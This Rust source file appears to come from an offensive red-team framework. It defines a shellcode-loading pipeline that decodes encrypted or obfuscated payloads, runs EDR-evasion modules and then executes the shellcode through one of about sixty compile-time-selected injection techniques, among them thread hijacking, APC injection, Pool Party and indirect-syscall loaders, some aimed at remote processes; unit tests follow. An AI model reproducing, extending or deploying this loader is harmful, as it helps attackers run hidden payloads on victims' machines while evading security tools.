//! Starship Launch — reusable API wrapping malefic-starship's
//! Load → Decode → Evade → Execute pipeline.

use crate::loaders::common::Shellcode;

/// Load shellcode from a file on disk.
pub fn load_shellcode(path: &str) -> Result<Shellcode, String> {
    let data = std::fs::read(path).map_err(|e| format!("Failed to read: {}", e))?;
    Ok(Shellcode::new(data))
}

/// Decode an encoded payload using whichever encoding feature is enabled.
///
/// If no encoding feature is active, returns `encoded` as-is.
#[allow(unused_variables)]
pub fn decode_payload(encoded: &[u8], key: &[u8], extra: &[u8]) -> Vec<u8> {
    #[cfg(feature = "enc_xor")]
    { return crate::decoder::xor::decode(encoded, key, extra); }

    #[cfg(feature = "enc_uuid")]
    { return crate::decoder::uuid::decode(encoded, key, extra); }

    #[cfg(feature = "enc_mac")]
    { return crate::decoder::mac::decode(encoded, key, extra); }

    #[cfg(feature = "enc_ipv4")]
    { return crate::decoder::ipv4::decode(encoded, key, extra); }

    #[cfg(feature = "enc_base64")]
    { return crate::decoder::base64_dec::decode(encoded, key, extra); }

    #[cfg(feature = "enc_base45")]
    { return crate::decoder::base45::decode(encoded, key, extra); }

    #[cfg(feature = "enc_base58")]
    { return crate::decoder::base58::decode(encoded, key, extra); }

    #[cfg(feature = "enc_aes")]
    { return crate::decoder::aes_dec::decode(encoded, key, extra); }

    #[cfg(feature = "enc_aes2")]
    { return crate::decoder::aes2::decode(encoded, key, extra); }

    #[cfg(feature = "enc_des")]
    { return crate::decoder::des_dec::decode(encoded, key, extra); }

    #[cfg(feature = "enc_chacha")]
    { return crate::decoder::chacha::decode(encoded, key, extra); }

    #[cfg(feature = "enc_rc4")]
    { return crate::decoder::rc4::decode(encoded, key, extra); }

    // No encoding feature enabled — pass through raw data
    #[allow(unreachable_code)]
    encoded.to_vec()
}

/// Returns `true` if any encoding feature is enabled at compile time.
pub fn has_encoding() -> bool {
    cfg!(any(
        feature = "enc_xor",
        feature = "enc_uuid",
        feature = "enc_mac",
        feature = "enc_ipv4",
        feature = "enc_base64",
        feature = "enc_base45",
        feature = "enc_base58",
        feature = "enc_aes",
        feature = "enc_aes2",
        feature = "enc_des",
        feature = "enc_chacha",
        feature = "enc_rc4",
    ))
}

/// Execute shellcode using the compile-time-selected loader technique.
///
/// # Safety
/// Executes arbitrary shellcode in the current process (or a remote process
/// identified by `target_pid`).
#[allow(unused_variables)]
pub unsafe fn execute_loader(shellcode: &Shellcode, target_pid: Option<u32>) -> Result<(), String> {
    #[cfg(feature = "apc_nttestalert")]
    { return crate::loaders::apc_nttestalert::execute(shellcode); }
    #[cfg(feature = "sifu_cityhash")]
    { return crate::loaders::sifu_cityhash::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "uuid_enum_locales")]
    { return crate::loaders::uuid_enum_locales::execute(shellcode); }
    #[cfg(feature = "remote_mockingjay")]
    { return crate::loaders::remote_mockingjay::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "thread_hijack")]
    { return crate::loaders::thread_hijack::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "func_ptr")]
    { return crate::loaders::func_ptr::execute(shellcode); }
    #[cfg(feature = "list_planting")]
    { return crate::loaders::list_planting::execute(shellcode); }
    #[cfg(feature = "dll_entrypoint_hijack")]
    { return crate::loaders::dll_entrypoint_hijack::execute(shellcode); }
    #[cfg(feature = "ninja_syscall")]
    { return crate::loaders::ninja_syscall::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "sifu_syscall")]
    { return crate::loaders::sifu_syscall::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "sifu_syscall_v2")]
    { return crate::loaders::sifu_syscall_v2::execute(shellcode); }
    #[cfg(feature = "basic_template")]
    { return crate::loaders::basic_template::execute(shellcode); }
    #[cfg(feature = "nt_api_remote")]
    { return crate::loaders::nt_api_remote::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "userland_api")]
    { return crate::loaders::userland_api::execute(shellcode, target_pid); }
    #[cfg(feature = "apc_write")]
    { return crate::loaders::apc_write::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "enum_fonts")]
    { return crate::loaders::enum_fonts::execute(shellcode); }
    #[cfg(feature = "dll_overload")]
    { return crate::loaders::dll_overload::execute(shellcode); }
    #[cfg(feature = "dll_overload_apc")]
    { return crate::loaders::dll_overload_apc::execute(shellcode); }
    #[cfg(feature = "veh_indirect_syscall")]
    { return crate::loaders::veh_indirect_syscall::execute(shellcode); }
    #[cfg(feature = "apc_dll_overload")]
    { return crate::loaders::apc_dll_overload::execute(shellcode); }
    #[cfg(feature = "nt_api_dynamic")]
    { return crate::loaders::nt_api_dynamic::execute(shellcode); }
    #[cfg(feature = "apc_dll_overload_peb")]
    { return crate::loaders::apc_dll_overload_peb::execute(shellcode); }
    #[cfg(feature = "apc_dll_overload_v2")]
    { return crate::loaders::apc_dll_overload_v2::execute(shellcode); }
    #[cfg(feature = "apc_ex2")]
    { return crate::loaders::apc_ex2::execute(shellcode); }
    #[cfg(feature = "halos_gate")]
    { return crate::loaders::halos_gate::execute(shellcode); }
    #[cfg(feature = "indirect_syscall")]
    { return crate::loaders::indirect_syscall::execute(shellcode); }
    #[cfg(feature = "direct_syscall")]
    { return crate::loaders::direct_syscall::execute(shellcode); }
    #[cfg(feature = "mac_enum_locales")]
    { return crate::loaders::mac_enum_locales::execute(shellcode); }
    #[cfg(feature = "apc_protect")]
    { return crate::loaders::apc_protect::execute(shellcode); }
    #[cfg(feature = "indirect_syscall_halo_stack")]
    { return crate::loaders::indirect_syscall_halo_stack::execute(shellcode, target_pid); }
    #[cfg(feature = "edr_sps_v1")]
    { return crate::loaders::edr_sps_v1::execute(shellcode); }
    #[cfg(feature = "edr_sps_v2_halo")]
    { return crate::loaders::edr_sps_v2_halo::execute(shellcode); }
    #[cfg(feature = "phantom_dll_apc")]
    { return crate::loaders::phantom_dll_apc::execute(shellcode); }
    #[cfg(feature = "threadless_apc")]
    { return crate::loaders::threadless_apc::execute(shellcode); }
    #[cfg(feature = "tls_callback")]
    { return crate::loaders::tls_callback::execute(shellcode); }
    #[cfg(feature = "threadpool_work")]
    { return crate::loaders::threadpool_work::execute(shellcode); }
    #[cfg(feature = "dll_notification")]
    { return crate::loaders::dll_notification::execute(shellcode); }
    #[cfg(feature = "jump_code_peb")]
    { return crate::loaders::jump_code_peb::execute(shellcode); }
    #[cfg(feature = "fiber_exec")]
    { return crate::loaders::fiber_exec::execute(shellcode); }
    #[cfg(feature = "atexit_callback")]
    { return crate::loaders::atexit_callback::execute(shellcode); }
    #[cfg(feature = "hwbp_exec")]
    { return crate::loaders::hwbp_exec::execute(shellcode); }
    #[cfg(feature = "hwbp_xor")]
    { return crate::loaders::hwbp_xor::execute(shellcode); }
    #[cfg(feature = "woodpecker")]
    { return crate::loaders::woodpecker::execute(shellcode); }
    #[cfg(feature = "rtl_thread_hook")]
    { return crate::loaders::rtl_thread_hook::execute(shellcode); }
    #[cfg(feature = "rop_trampoline")]
    { return crate::loaders::rop_trampoline::execute(shellcode); }
    #[cfg(feature = "phantom_dll_indirect")]
    { return crate::loaders::phantom_dll_indirect::execute(shellcode); }
    #[cfg(feature = "rc4_variant")]
    { return crate::loaders::rc4_variant::execute(shellcode); }
    #[cfg(feature = "veh_rop")]
    { return crate::loaders::veh_rop::execute(shellcode); }
    #[cfg(feature = "exception_debug")]
    { return crate::loaders::exception_debug::execute(shellcode); }
    #[cfg(feature = "veh_vch")]
    { return crate::loaders::veh_vch::execute(shellcode); }
    #[cfg(feature = "remote_thread_self")]
    { return crate::loaders::remote_thread_self::execute(shellcode); }
    #[cfg(feature = "vmt_hook")]
    { return crate::loaders::vmt_hook::execute(shellcode); }
    #[cfg(feature = "vmt_trampoline")]
    { return crate::loaders::vmt_trampoline::execute(shellcode); }
    #[cfg(feature = "veh_debug_reg")]
    { return crate::loaders::veh_debug_reg::execute(shellcode); }
    #[cfg(feature = "vt_ptr_redirect")]
    { return crate::loaders::vt_ptr_redirect::execute(shellcode); }
    #[cfg(feature = "callback_final")]
    { return crate::loaders::callback_final::execute(shellcode); }

    #[cfg(feature = "pool_party_v1_worker_factory")]
    { return crate::loaders::pool_party_v1_worker_factory::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "pool_party_v2_tp_work")]
    { return crate::loaders::pool_party_v2_tp_work::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "pool_party_v3_tp_wait")]
    { return crate::loaders::pool_party_v3_tp_wait::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "pool_party_v4_tp_io")]
    { return crate::loaders::pool_party_v4_tp_io::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "pool_party_v5_tp_alpc")]
    { return crate::loaders::pool_party_v5_tp_alpc::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "pool_party_v6_tp_job")]
    { return crate::loaders::pool_party_v6_tp_job::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "pool_party_v7_tp_direct")]
    { return crate::loaders::pool_party_v7_tp_direct::execute(shellcode, target_pid.unwrap_or(0)); }
    #[cfg(feature = "pool_party_v8_tp_timer")]
    { return crate::loaders::pool_party_v8_tp_timer::execute(shellcode, target_pid.unwrap_or(0)); }

    #[allow(unreachable_code)]
    Err("No loader feature enabled. Use --features <loader_name>".to_string())
}

/// One-shot pipeline: decode → evade → execute.
///
/// Pass raw (possibly encoded) shellcode bytes. If an encoding feature is
/// enabled, `key` and `extra` are used for decoding; otherwise they are
/// ignored and can be `None`.
///
/// # Safety
/// Executes arbitrary shellcode. See [`execute_loader`] for details.
pub unsafe fn run(
    shellcode_data: Vec<u8>,
    key: Option<&[u8]>,
    extra: Option<&[u8]>,
    target_pid: Option<u32>,
) -> Result<(), String> {
    // Stage 1: Decode
    let decoded = if has_encoding() {
        let k = key.unwrap_or(&[]);
        let e = extra.unwrap_or(&[]);
        decode_payload(&shellcode_data, k, e)
    } else {
        shellcode_data
    };

    let shellcode = Shellcode::new(decoded);

    // Stage 2: Run evasion modules
    malefic_evader::run_evaders();

    // Stage 3: Execute
    execute_loader(&shellcode, target_pid)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn shellcode_new_and_accessors() {
        let data = vec![0x90, 0x90, 0xCC];
        let sc = Shellcode::new(data.clone());
        assert_eq!(sc.len(), 3);
        assert!(!sc.is_empty());
        assert_eq!(sc.as_slice(), &data[..]);
        assert_eq!(unsafe { *sc.as_ptr() }, 0x90);
    }

    #[test]
    fn shellcode_from_slice() {
        let buf = [0xCC; 8];
        let sc = Shellcode::from_slice(&buf);
        assert_eq!(sc.len(), 8);
        assert_eq!(sc.as_slice(), &buf);
    }

    #[test]
    fn shellcode_empty() {
        let sc = Shellcode::new(vec![]);
        assert!(sc.is_empty());
        assert_eq!(sc.len(), 0);
    }

    #[test]
    fn load_shellcode_from_file() {
        let dir = std::env::temp_dir();
        let path = dir.join("starship_sdk_test_payload.bin");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            f.write_all(&[0x41, 0x42, 0x43]).unwrap();
        }
        let sc = load_shellcode(path.to_str().unwrap()).unwrap();
        assert_eq!(sc.as_slice(), &[0x41, 0x42, 0x43]);
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn load_shellcode_missing_file() {
        let result = load_shellcode("__nonexistent_file_starship_sdk__");
        assert!(result.is_err());
        match result {
            Err(e) => assert!(e.contains("Failed to read")),
            Ok(_) => panic!("expected error"),
        }
    }

    #[test]
    fn decode_payload_passthrough() {
        let raw = vec![0xDE, 0xAD, 0xBE, 0xEF];
        let out = decode_payload(&raw, &[], &[]);
        assert_eq!(out, raw);
    }

    #[test]
    fn decode_payload_passthrough_with_key() {
        let raw = vec![1, 2, 3, 4, 5];
        let key = vec![0xFF; 16];
        let extra = vec![0xAA; 8];
        let out = decode_payload(&raw, &key, &extra);
        assert_eq!(out, raw);
    }

    #[test]
    fn has_encoding_reflects_features() {
        let expected = cfg!(any(
            feature = "enc_xor",
            feature = "enc_uuid",
            feature = "enc_mac",
            feature = "enc_ipv4",
            feature = "enc_base64",
            feature = "enc_base45",
            feature = "enc_base58",
            feature = "enc_aes",
            feature = "enc_aes2",
            feature = "enc_des",
            feature = "enc_chacha",
            feature = "enc_rc4",
        ));
        assert_eq!(has_encoding(), expected);
    }

    #[test]
    fn execute_loader_no_feature_returns_err() {
        if !cfg!(any(
            feature = "func_ptr",
            feature = "apc_nttestalert",
            feature = "basic_template",
        )) {
            let sc = Shellcode::new(vec![0xCC]);
            let result = unsafe { execute_loader(&sc, None) };
            assert!(result.is_err());
            assert!(result.unwrap_err().contains("No loader feature enabled"));
        }
    }

    #[test]
    fn loader_names_is_populated() {
        assert_eq!(crate::LOADER_NAMES.len(), 64);
    }

    #[test]
    fn loader_names_no_duplicates() {
        let mut seen = std::collections::HashSet::new();
        for name in crate::LOADER_NAMES {
            assert!(seen.insert(name), "Duplicate loader name: {}", name);
        }
    }

    #[test]
    fn random_loader_in_list() {
        let name = crate::random_loader();
        assert!(
            crate::LOADER_NAMES.contains(&name),
            "random_loader() returned '{}' not in LOADER_NAMES",
            name,
        );
    }

    #[test]
    fn types_module_accessible() {
        assert_eq!(crate::types::MEM_COMMIT, 0x1000);
        assert_eq!(crate::types::PAGE_EXECUTE_READWRITE, 0x40);
        assert_eq!(crate::types::PROCESS_ALL_ACCESS, 0x001F0FFF);
    }

    #[test]
    fn run_no_loader_returns_err() {
        if !cfg!(any(
            feature = "func_ptr",
            feature = "apc_nttestalert",
            feature = "basic_template",
        )) {
            let result = unsafe { run(vec![0x90], None, None, None) };
            assert!(result.is_err());
        }
    }
}
